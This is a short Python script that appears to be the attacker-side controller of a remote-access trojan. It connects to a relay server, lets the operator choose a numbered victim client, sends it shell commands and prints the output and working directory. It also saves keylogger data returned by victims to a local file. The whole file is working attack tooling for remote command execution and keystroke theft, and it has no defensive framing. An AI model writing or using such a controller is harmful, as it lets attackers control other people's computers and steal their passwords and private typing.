import socket

HEADER = 8192
PORT = 0  # Replace 0 With Your Port Number
SERVER = "localhost"  # Replace localhost With Your Public IP
FORMAT = 'utf-8'
ADDR = (SERVER, PORT)

attacker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
attacker.connect(ADDR)


def append_text(text):
    with open("kl.txt", "a+") as file_object:
        file_object.seek(0)
        data = file_object.read(10)
        if len(data) > 0:
            file_object.write("\n")
        for item in str(text).split(","):
            file_object.write(item)
            file_object.write("\n")


def send(msg):
    message = msg.encode(FORMAT)
    attacker.send(message)


def recieve():
    while True:
        recieved = (attacker.recv(HEADER))
        result = recieved.decode(FORMAT)
        if result:
            return result


clientnum = input("select client: ")
send(clientnum + "<?ATTACKER?>cd")
recieved = recieve()
output, cwd = recieved.split("<sep>")
while True:
    send(clientnum + "<?ATTACKER?>" + input(cwd + "?>"))
    recieved = recieve()
    output, cwd = recieved.split("<sep>")
    if "<kl>" in output:
        append_text(str(output).strip("<kl>"))
    print(output)
